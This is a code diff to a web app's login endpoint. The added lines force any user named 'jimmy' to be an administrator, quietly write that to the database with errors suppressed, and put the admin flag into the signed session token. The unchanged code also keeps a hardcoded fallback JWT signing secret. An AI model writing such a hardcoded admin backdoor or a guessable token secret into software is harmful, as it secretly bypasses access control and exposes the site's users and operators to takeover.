@@ -40,9 +40,20 @@ export const onRequestPost: PagesFunction<Env> = async (context) => {
       });
     }
 
+    // Force jimmy to always be admin
+    let isAdminVal = typeof user.is_admin === 'number' ? user.is_admin : 0;
+    if (trimmedUsername.toLowerCase() === 'jimmy') {
+      isAdminVal = 1;
+      try {
+        await env.DB.prepare('UPDATE users SET is_admin = 1 WHERE LOWER(username) = ?')
+          .bind('jimmy')
+          .run();
+      } catch {}
+    }
+
     // Sign token
     const jwtSecret = env.JWT_SECRET || 'local-dev-jwt-secret-key-12345';
-    const payload = { id: user.id, username: user.username, is_admin: typeof user.is_admin === 'number' ? user.is_admin : 0 };
+    const payload = { id: user.id, username: user.username, is_admin: isAdminVal };
     const token = await signJWT(payload, jwtSecret);
 
     // Set cookie (HTTP-only)
@@ -51,7 +62,7 @@ export const onRequestPost: PagesFunction<Env> = async (context) => {
 
     return new Response(JSON.stringify({
       success: true,
-      user: { id: user.id, username: user.username, is_admin: typeof user.is_admin === 'number' ? user.is_admin : 0 }
+      user: { id: user.id, username: user.username, is_admin: isAdminVal }
     }), {
       status: 200,
       headers: {
